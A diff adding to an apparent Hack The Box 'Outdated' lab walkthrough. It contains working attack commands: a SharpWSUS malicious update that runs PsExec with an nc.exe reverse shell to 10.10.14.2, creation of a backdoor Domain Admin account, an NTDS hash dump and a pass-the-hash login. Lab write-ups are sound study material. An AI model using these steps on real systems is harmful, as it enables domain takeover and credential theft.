@@ -914,6 +914,62 @@ Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\sflowers\Documents> 
 ```
 
+This time we are not connected on the `Client` VM. We are on the the `DC`.
+
+```bash
+*Evil-WinRM* PS C:\Temp> hostname
+DC
+```
+
+```bash
+*Evil-WinRM* PS C:\Temp> ipconfig /all
+
+Windows IP Configuration
+
+   Host Name . . . . . . . . . . . . : DC
+   Primary Dns Suffix  . . . . . . . : outdated.htb
+   Node Type . . . . . . . . . . . . : Hybrid
+   IP Routing Enabled. . . . . . . . : No
+   WINS Proxy Enabled. . . . . . . . : No
+   DNS Suffix Search List. . . . . . : outdated.htb
+                                       htb
+
+Ethernet adapter Ethernet0 3:
+
+   Connection-specific DNS Suffix  . : htb
+   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
+   Physical Address. . . . . . . . . : 00-50-56-B0-FA-E8
+   DHCP Enabled. . . . . . . . . . . : No
+   Autoconfiguration Enabled . . . . : Yes
+   IPv6 Address. . . . . . . . . . . : dead:beef::207(Preferred)
+   Lease Obtained. . . . . . . . . . : Monday, July 29, 2024 5:13:42 PM
+   Lease Expires . . . . . . . . . . : Monday, July 29, 2024 6:43:42 PM
+   IPv6 Address. . . . . . . . . . . : dead:beef::24c3:9732:8e3b:af4d(Preferred)
+   Link-local IPv6 Address . . . . . : fe80::24c3:9732:8e3b:af4d%15(Preferred)
+   IPv4 Address. . . . . . . . . . . : 10.10.11.175(Preferred)
+   Subnet Mask . . . . . . . . . . . : 255.255.254.0
+   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:adf7%15
+                                       10.10.10.2
+   DHCPv6 IAID . . . . . . . . . . . : 486559830
+   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-2E-39-E8-8D-00-50-56-B0-FA-E8
+   DNS Servers . . . . . . . . . . . : 127.0.0.1
+   NetBIOS over Tcpip. . . . . . . . : Enabled
+   Connection-specific DNS Suffix Search List :
+                                       htb
+
+Ethernet adapter vEthernet (vSwitch):
+
+   Connection-specific DNS Suffix  . :
+   Description . . . . . . . . . . . : Hyper-V Virtual Ethernet Adapter
+   Physical Address. . . . . . . . . : 00-15-5D-19-AE-00
+   DHCP Enabled. . . . . . . . . . . : No
+   Autoconfiguration Enabled . . . . : Yes
+   IPv4 Address. . . . . . . . . . . : 172.16.20.1(Preferred)
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 0.0.0.0
+   NetBIOS over Tcpip. . . . . . . . : Enabled
+```
+
 ```bash
 *Evil-WinRM* PS C:\Users\sflowers\Documents> whoami /all
 
@@ -961,27 +1017,451 @@ User claims unknown.
 Kerberos support for Dynamic Access Control on this device has been disabled.
 ```
 
-`sflowers` is member of `OUTDATED\WSUS Administrators`.
+`sflowers` is member of `OUTDATED\WSUS Administrators`.  We may be able to use [SharpWSUS](https://github.com/nettitude/SharpWSUS) to escalate privileges here.
+
+We can again go back to our Visual Studion on a Windows machine, close the repository and build the solution. After that we transfer it to our Kali and then to the target.
 
 ```bash
+Rebuild started at 10:03 AM...
+1>------ Rebuild All started: Project: SharpWSUS, Configuration: Release Any CPU ------
+1>  SharpWSUS -> C:\Users\Kali\Projects\SharpWSUS\SharpWSUS\bin\Release\SharpWSUS.exe
+========== Rebuild All: 1 succeeded, 0 failed, 0 skipped ==========
+========== Rebuild completed at 10:04 AM and took 05.687 seconds ==========
 ```
 
 ```bash
+impacket-smbserver share $(pwd) -smb2support -user kali -pass kali
 ```
 
 ```bash
+PS C:\Users\Kali> net use \\192.168.9.114\share /USER:kali kali
+The command completed successfully.
+
+PS C:\Users\Kali> xcopy C:\Users\Kali\Projects\SharpWSUS\SharpWSUS\bin\Release\SharpWSUS.exe \\192.168.9.114\share
+C:\Users\Kali\Projects\SharpWSUS\SharpWSUS\bin\Release\SharpWSUS.exe
 ```
 
 ```bash
+mv SharpWSUS.exe follina.py/www/
 ```
 
 ```bash
+*Evil-WinRM* PS C:\Temp> Invoke-WebRequest -Uri 'http://10.10.14.2/SharpWSUS.exe' -OutFile 'C:\Temp\SharpWSUS.exe'
 ```
 
 ```bash
+*Evil-WinRM* PS C:\Temp> reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate 
+
+HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
+    SetActiveHours    REG_DWORD    0x1
+    ActiveHoursStart    REG_DWORD    0x0
+    ActiveHoursEnd    REG_DWORD    0x17
+    AcceptTrustedPublisherCerts    REG_DWORD    0x1
+    ExcludeWUDriversInQualityUpdate    REG_DWORD    0x1
+    DoNotConnectToWindowsUpdateInternetLocations    REG_DWORD    0x1
+    WUServer    REG_SZ    http://wsus.outdated.htb:8530
+    WUStatusServer    REG_SZ    http://wsus.outdated.htb:8530
+    UpdateServiceUrlAlternate    REG_SZ
+
+HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate\AU
 ```
 
 ```bash
+*Evil-WinRM* PS C:\Temp> C:\Temp\SharpWSUS.exe locate
+
+ ____  _                   __        ______  _   _ ____
+/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
+\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
+ ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
+|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
+                       |_|
+           Phil Keeble @ Nettitude Red Team
+
+[*] Action: Locate WSUS Server
+WSUS Server: http://wsus.outdated.htb:8530
+
+[*] Locate complete
+```
+
+```bash
+*Evil-WinRM* PS C:\Temp> Resolve-DNSName -Name wsus.outdated.htb -Type A -Server 127.0.0.1
+
+Name                           Type   TTL   Section    NameHost
+----                           ----   ---   -------    --------
+wsus.outdated.htb              CNAME  3600  Answer     dc.outdated.htb
+
+Name       : dc.outdated.htb
+QueryType  : A
+TTL        : 1200
+Section    : Answer
+IP4Address : 10.10.11.175
+
+
+Name       : dc.outdated.htb
+QueryType  : A
+TTL        : 1200
+Section    : Answer
+IP4Address : 172.16.20.1
+```
+
+The address `wsus.outdated.htb` is a `CNAME` to `dc.outdated.htb`.
+
+```bash
+*Evil-WinRM* PS C:\Temp> C:\Temp\SharpWSUS.exe inspect
+
+ ____  _                   __        ______  _   _ ____
+/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
+\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
+ ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
+|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
+                       |_|
+           Phil Keeble @ Nettitude Red Team
+
+[*] Action: Inspect WSUS Server
+
+################# WSUS Server Enumeration via SQL ##################
+ServerName, WSUSPortNumber, WSUSContentLocation
+-----------------------------------------------
+DC, 8530, c:\WSUS\WsusContent
+
+
+####################### Computer Enumeration #######################
+ComputerName, IPAddress, OSVersion, LastCheckInTime
+---------------------------------------------------
+dc.outdated.htb, 172.16.20.1, 10.0.17763.1432, 7/30/2024 12:14:53 AM
+
+####################### Downstream Server Enumeration #######################
+ComputerName, OSVersion, LastCheckInTime
+---------------------------------------------------
+
+####################### Group Enumeration #######################
+GroupName
+---------------------------------------------------
+All Computers
+Downstream Servers
+Unassigned Computers
+
+[*] Inspect complete
+```
+
+```bash
+*Evil-WinRM* PS C:\Temp> dir c:\WSUS\WsusContent
+
+
+    Directory: C:\WSUS\WsusContent
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        6/15/2022   7:38 AM              0 anonymousCheckFile.txt
+-a---l        7/20/2022   8:34 PM              0 wuagent.exe
+```
+
+To be take advantage of our permissions here, I will need Microsoft signed executable to run during the update. For that I will use `psexec.exe` from Sysinternals. I will also need to transfer to the target `nc.exe` to perform a reverse shell back to my kali.
+
+```bash
+*Evil-WinRM* PS C:\Temp> upload ../../../../../home/kali/Desktop/HTB/Academy/AD/Tools/SysinternalsSuite/PsEx
+ec64.exe .
+
+Info: Uploading /home/kali/Desktop/HTB/Outdated/../../../../../home/kali/Desktop/HTB/Academy/AD/Tools/SysinternalsSuite/PsExec64.exe to C:\Temp\.
+Data: 1438228 bytes of 1438228 bytes copied
+Info: Upload successful!
+
+*Evil-WinRM* PS C:\Temp> upload ../../../../../home/kali/Desktop/HTB/Academy/AD/Tools/nc.exe .
+
+Info: Uploading /home/kali/Desktop/HTB/Outdated/../../../../../home/kali/Desktop/HTB/Academy/AD/Tools/nc.exe to C:\Temp\.
+Data: 79188 bytes of 79188 bytes copied
+Info: Upload successful!
+```
+
+To be sure this is going to work, we can run the `psexec` and `nc` as the current user to connect back to our machine only to test.
+
+```bash
+$ rlwrap -cAr nc -nlvp 445 
+listening on [any] 445 ...
+```
+
+In this case we don't use the paramenter `-s` as we don't have system yet.
+
+```bash
+*Evil-WinRM* PS C:\Temp> C:\Temp\PsExec64.exe -accepteula -d C:\Temp\nc.exe -e cmd.exe 10.10.14.2 445
+
+PsExec v2.34 - Execute processes remotely
+Copyright (C) 2001-2021 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+PsExec64.exe : C:\Temp\nc.exe started with process ID 1380.
+    + CategoryInfo          : NotSpecified: (C:\Temp\nc.exe ...rocess ID 1380.:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+```
+
+We got our test shell.
+
+```bash
+$ rlwrap -cAr nc -nlvp 445
+listening on [any] 445 ...
+connect to [10.10.14.2] from (UNKNOWN) [10.10.11.175] 60215
+Microsoft Windows [Version 10.0.17763.1432]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Temp>exit
+```
+
+Lets re-start the listener.
+
+```bash
+$ rlwrap -cAr nc -nlvp 445 
+listening on [any] 445 ...
+```
+
+Now lets create the update with our reverse shell payload.
+
+```bash
+*Evil-WinRM* PS C:\Temp> C:\Temp\SharpWSUS.exe create /payload:"C:\Temp\PsExec64.exe" /args:" -accepteula -s -d C:\Temp\nc.exe -e cmd.exe 10.10.14.2 445" /title:"WSUS update"
+
+ ____  _                   __        ______  _   _ ____
+/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
+\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
+ ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
+|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
+                       |_|
+           Phil Keeble @ Nettitude Red Team
+
+[*] Action: Create Update
+[*] Creating patch to use the following:
+[*] Payload: PsExec64.exe
+[*] Payload Path: C:\Temp\PsExec64.exe
+[*] Arguments:  -accepteula -s -d C:\Temp\nc.exe -e cmd.exe 10.10.14.2 445
+[*] Arguments (HTML Encoded):  -accepteula -s -d C:\Temp\nc.exe -e cmd.exe 10.10.14.2 445
+
+################# WSUS Server Enumeration via SQL ##################
+ServerName, WSUSPortNumber, WSUSContentLocation
+-----------------------------------------------
+DC, 8530, c:\WSUS\WsusContent
+
+ImportUpdate
+Update Revision ID: 32
+PrepareXMLtoClient
+InjectURL2Download
+DeploymentRevision
+PrepareBundle
+PrepareBundle Revision ID: 33
+PrepareXMLBundletoClient
+DeploymentRevision
+
+[*] Update created - When ready to deploy use the following command:
+[*] SharpWSUS.exe approve /updateid:8cf43566-c1e2-4947-9c11-33838005dc0b /computername:Target.FQDN /groupname:"Group Name"
+
+[*] To check on the update status use the following command:
+[*] SharpWSUS.exe check /updateid:8cf43566-c1e2-4947-9c11-33838005dc0b /computername:Target.FQDN
+
+[*] To delete the update use the following command:
+[*] SharpWSUS.exe delete /updateid:8cf43566-c1e2-4947-9c11-33838005dc0b /computername:Target.FQDN /groupname:"Group Name"
+
+[*] Create complete
+```
+
+```bash
+*Evil-WinRM* PS C:\Temp> C:\Temp\SharpWSUS.exe approve /updateid:8cf43566-c1e2-4947-9c11-33838005dc0b /computername:dc.outdated.htb /groupname:"CriticalPatches"
+
+ ____  _                   __        ______  _   _ ____
+/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
+\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
+ ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
+|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
+                       |_|
+           Phil Keeble @ Nettitude Red Team
+
+[*] Action: Approve Update
+
+Targeting dc.outdated.htb
+TargetComputer, ComputerID, TargetID
+------------------------------------
+dc.outdated.htb, bd6d57d0-5e6f-4e74-a789-35c8955299e1, 1
+Group Exists = False
+Group Created: CriticalPatches
+Added Computer To Group
+Approved Update
+
+[*] Approve complete
+```
+
+```bash
+*Evil-WinRM* PS C:\Temp> C:\Temp\SharpWSUS.exe check /updateid:8cf43566-c1e2-4947-9c11-33838005dc0b /computername:dc.outda
+ted.htb
+
+ ____  _                   __        ______  _   _ ____
+/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
+\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
+ ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
+|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
+                       |_|
+           Phil Keeble @ Nettitude Red Team
+
+[*] Action: Check Update
+
+Targeting dc.outdated.htb
+TargetComputer, ComputerID, TargetID
+------------------------------------
+dc.outdated.htb, bd6d57d0-5e6f-4e74-a789-35c8955299e1, 1
+
+[*] Update is not installed
+
+[*] Check complete
+```
+
+```bash
+$ rlwrap -cAr nc -nlvp 445
+listening on [any] 445 ...
+connect to [10.10.14.2] from (UNKNOWN) [10.10.11.175] 60241
+Microsoft Windows [Version 10.0.17763.1432]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>
+```
+
+```bash
+*Evil-WinRM* PS C:\Temp> C:\Temp\SharpWSUS.exe check /updateid:8cf43566-c1e2-4947-9c11-33838005dc0b /computername:dc.outdated.htb
+
+ ____  _                   __        ______  _   _ ____
+/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
+\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
+ ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
+|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
+                       |_|
+           Phil Keeble @ Nettitude Red Team
+
+[*] Action: Check Update
+
+Targeting dc.outdated.htb
+TargetComputer, ComputerID, TargetID
+------------------------------------
+dc.outdated.htb, bd6d57d0-5e6f-4e74-a789-35c8955299e1, 1
+
+[*] Update is installed
+
+[*] Check complete
+```
+
+```bash
+$ rlwrap -cAr nc -nlvp 445
+listening on [any] 445 ...
+connect to [10.10.14.2] from (UNKNOWN) [10.10.11.175] 60241
+Microsoft Windows [Version 10.0.17763.1432]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+```
+
+## Extra
+
+```bash
+PS C:\Temp> systeminfo
+systeminfo
+
+Host Name:                 DC
+OS Name:                   Microsoft Windows Server 2019 Standard
+OS Version:                10.0.17763 N/A Build 17763
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Primary Domain Controller
+OS Build Type:             Multiprocessor Free
+Registered Owner:          Windows User
+Registered Organization:   
+Product ID:                00429-00521-62775-AA339
+Original Install Date:     6/14/2022, 10:28:53 AM
+System Boot Time:          7/29/2024, 5:13:28 PM
+System Manufacturer:       VMware, Inc.
+System Model:              VMware7,1
+System Type:               x64-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2445 Mhz
+BIOS Version:              VMware, Inc. VMW71.00V.23553139.B64.2403260936, 3/26/2024
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume2
+System Locale:             en-us;English (United States)
+Input Locale:              en-us;English (United States)
+Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
+Total Physical Memory:     4,095 MB
+Available Physical Memory: 679 MB
+Virtual Memory: Max Size:  4,799 MB
+Virtual Memory: Available: 1,233 MB
+Virtual Memory: In Use:    3,566 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    outdated.htb
+Logon Server:              N/A
+Hotfix(s):                 3 Hotfix(s) Installed.
+                           [01]: KB4514366
+                           [02]: KB4512577
+                           [03]: KB4571748
+Network Card(s):           2 NIC(s) Installed.
+                           [01]: Hyper-V Virtual Ethernet Adapter
+                                 Connection Name: vEthernet (vSwitch)
+                                 DHCP Enabled:    No
+                                 IP address(es)
+                                 [01]: 172.16.20.1
+                           [02]: vmxnet3 Ethernet Adapter
+                                 Connection Name: Ethernet0 3
+                                 DHCP Enabled:    No
+                                 IP address(es)
+                                 [01]: 10.10.11.175
+                                 [02]: fe80::24c3:9732:8e3b:af4d
+                                 [03]: dead:beef::24c3:9732:8e3b:af4d
+                                 [04]: dead:beef::207
+Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
+```
+
+```bash
+PS C:\Temp> get-vm
+get-vm
+
+Name   State   CPUUsage(%) MemoryAssigned(M) Uptime           Status             Version
+----   -----   ----------- ----------------- ------           ------             -------
+Client Running 0           1414              01:29:55.3190000 Operating normally 9.0
+```
+
+### NTDS - get Administrator's hash
+
+```bash
+C:\Temp> net user kali P4ssw0rd1 /add /domain
+The command completed successfully.
+```
+
+```bash
+C:\Temp> net group "Domain Admins" kali /add /domain
+The command completed successfully.
+```
+
+```bash
+C:\Temp> net group "Domain Admins"
+
+Group name     Domain Admins
+Comment        Designated administrators of the domain
+
+Members
+-------------------------------------------------------------------------------
+Administrator            kali                     
+The command completed successfully.
+```
+
+```bash
+$ netexec smb $TARGET -u 'kali' -p 'P4ssw0rd1' --ntds --user administrator
+SMB         10.10.11.175    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:outdated.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.175    445    DC               [+] outdated.htb\kali:P4ssw0rd1 (Pwn3d!)
+SMB         10.10.11.175    445    DC               [+] Dumping the NTDS, this could take a while so go grab a redbull...
+SMB         10.10.11.175    445    DC               Administrator:500:aad3b435b51404eeaad3b435b51404ee:716f1ce2e2cf38ee1210cce35eb78cb6:::
+SMB         10.10.11.175    445    DC               [+] Dumped 1 NTDS hashes to /home/kali/.nxc/logs/DC_10.10.11.175_2024-07-29_144546.ntds of which 1 were added to the database
+SMB         10.10.11.175    445    DC               [*] To extract only enabled accounts from the output file, run the following command: 
+SMB         10.10.11.175    445    DC               [*] cat /home/kali/.nxc/logs/DC_10.10.11.175_2024-07-29_144546.ntds | grep -iv disabled | cut -d ':' -f1
+SMB         10.10.11.175    445    DC               [*] grep -iv disabled /home/kali/.nxc/logs/DC_10.10.11.175_2024-07-29_144546.ntds | cut -d ':' -f1
+```
+
+```bash
+$ netexec smb $TARGET -u 'Administrator' -H '716f1ce2e2cf38ee1210cce35eb78cb6' 
+SMB         10.10.11.175    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:outdated.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.175    445    DC               [+] outdated.htb\Administrator:716f1ce2e2cf38ee1210cce35eb78cb6 (Pwn3d!)
 ```
 
 ```bash
